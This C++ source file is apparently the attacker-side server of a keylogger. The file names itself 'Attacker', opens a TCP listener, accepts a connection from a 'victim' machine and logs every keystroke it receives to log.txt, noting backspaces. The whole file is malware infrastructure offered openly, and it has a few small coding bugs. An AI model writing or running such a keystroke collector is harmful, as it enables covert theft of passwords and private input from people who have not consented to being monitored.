#include "Attacker.h"

Attacker::Attacker(): _log("log.txt") {
	this->_wsa_data;
	int res;
	sockaddr_in victim_sock_info;

	res = WSAStartup(MAKEWORD(2, 2), &this->_wsa_data);
	if (res != 0) {
		std::cout << "Error while initializing winsock" << std::endl;
	}

	this->_attacker_sock_info.sin_family = AF_INET;
	this->_attacker_sock_info.sin_port = htons(DEST_PORT);
	this->_attacker_sock_info.sin_addr.s_addr = htons(INADDR_ANY);

	this->_attacker_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (this->_attacker_socket == INVALID_SOCKET) {
		std::cerr << "error creating socket";
		WSACleanup();
	}

	std::cout << "Binding..." << std::endl;
	if (bind(this->_attacker_socket, (sockaddr*)&this->_attacker_sock_info, sizeof(this->_attacker_sock_info)) == -1) {
		std::cerr << "error while binding.\n" << WSAGetLastError();
		closesocket(this->_attacker_socket);
		WSACleanup();
	}
	std::cout << "Binded.\n";

	std::cout << "Atempting to listen...\n";
	if (::listen(this->_attacker_socket, 1) != 0) {
		std::cerr << "error while listening.\n";
		closesocket(this->_attacker_socket);
		WSACleanup();
	}
	std::cout << "Listening on port " << DEST_PORT << std::endl;

	int len = sizeof(victim_sock_info);
	this->_victim_socket = accept(this->_attacker_socket, (SOCKADDR*)&victim_sock_info, &len);
	if (this->_victim_socket == SOCKET_ERROR) {
		std::cout << "Could not accept socket connection." << WSAGetLastError << std::endl;
		closesocket(this->_attacker_socket);
		WSACleanup();
	}

	std::cout << "Connected" << std::endl;
}

Attacker::~Attacker() {
	this->_log.close();
	closesocket(this->_attacker_socket);
	WSACleanup();
}


void Attacker::readKeys() {
	char lastKey = 0;

	while (true) {
		if (recv(this->_victim_socket, &lastKey, sizeof(lastKey), NULL) != SOCKET_ERROR) {
			if (lastKey == BACKSPACE_IN_ASCII) {
				this->_log << "[BACKSPACE]";
				continue;
			}
			

			this->_log << lastKey;
		}
		
	}
}